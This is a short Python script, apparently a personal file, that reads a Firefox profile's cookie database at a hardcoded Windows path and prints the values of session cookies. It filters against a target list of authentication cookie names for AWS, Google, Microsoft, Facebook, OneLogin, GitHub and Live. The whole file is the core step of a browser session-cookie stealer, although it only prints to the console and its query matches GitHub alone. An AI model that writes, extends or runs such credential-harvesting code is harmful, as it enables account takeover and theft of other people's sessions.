import sqlite3
import os

# Paths for cookies
firefox_profile = "8x4tlzwe.default-release-1731914697422"
firefox_path = os.path.join("C:\\Users\\Yoghi\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", firefox_profile, "cookies.sqlite")

# Connect to Firefox cookie database (example)
conn = sqlite3.connect(firefox_path)
c = conn.cursor()
c.execute("SELECT * FROM moz_cookies WHERE host LIKE '%github.com%';")

# Fetch cookie data
data = c.fetchall()

# Filter cookies of interest
cookies = {
    ".amazon.com": ["aws-userInfo", "aws-creds"],
    ".google.com": ["OSID", "HSID", "SID", "SSID", "APISID", "SAPISID", "LSID"],
    ".microsoftonline.com": ["ESTSAUTHPERSISTENT"],
    ".facebook.com": ["c_user", "cs"],
    ".onelogin.com": ["sub_session_onelogin.com"],
    ".github.com": ["user_session","_device_id"],
    ".live.com": ["RPSSecAuth"],
}

# for cookie in data:
#     if "github.com" in cookie[4]:  # Match 'github.com' domain
#         print(f"Host: {cookie[4]}, Name: {cookie[2]}, Value: {cookie[3][:20]}")

for domain, cookie_names in cookies.items():
    for cookie in data:
        if domain.lstrip(".") in cookie[4] and cookie[2] in cookie_names:
            print(f"Host: {cookie[4]}, Name: {cookie[2]}, Value: {cookie[3][:20]}")


